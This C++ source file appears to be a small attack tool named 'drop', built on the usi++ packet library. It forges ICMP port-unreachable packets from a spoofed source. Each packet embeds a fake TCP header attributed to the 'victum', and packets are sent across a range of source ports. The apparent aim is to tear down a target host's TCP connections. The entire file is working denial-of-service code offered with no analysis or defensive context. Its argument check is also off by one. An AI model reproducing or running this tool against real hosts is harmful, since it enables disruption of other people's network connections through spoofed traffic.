#include <iostream>
#include <usi++/usi++.h>
#include <string>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <usi++/usi-structs.h>

void usage()
{
	cout<<"Usage: drop <srcaddr> <srcport>  <dstaddr>\n"
	    <<"		'srcaddr' is the host that should send the ICMP packet\n\n";
	exit(1);
}

int main(int argc, char **argv)
{
	if (argc < 3)
		usage();

	string srcaddr(argv[1]), dstaddr(argv[3]);
	int srcport = atoi(argv[2]);
	char payload[sizeof(iphdr) + sizeof(tcphdr)];
	memset(payload, 0, sizeof(payload));

	// build a faked packet that victum has sent
	TCP *tcp = new TCP(dstaddr.c_str());
	tcp->set_dst(srcaddr.c_str());
	tcp->set_src(dstaddr.c_str());
	tcp->set_dstport(srcport);
	tcp->set_flags(TH_PUSH|TH_ACK);

	ICMP *icmp = new ICMP(dstaddr.c_str());

	icmp->set_src(srcaddr.c_str());
	icmp->set_type(ICMP_DEST_UNREACH);
	icmp->set_code(ICMP_PORT_UNREACH);

	for (int i = 100; i < 2048; ++i) {
		tcp->set_srcport(i);
		iphdr iph = tcp->get_iphdr();
		tcphdr tcph = tcp->get_tcphdr();

		memcpy(payload, &iph, sizeof(iph));
		memcpy(payload+sizeof(iph), &tcph, 8);

		icmp->sendpack(payload, sizeof(iph)+8);
		usleep(10000);
	}

	delete icmp;
	delete tcp;

	return 0;
}

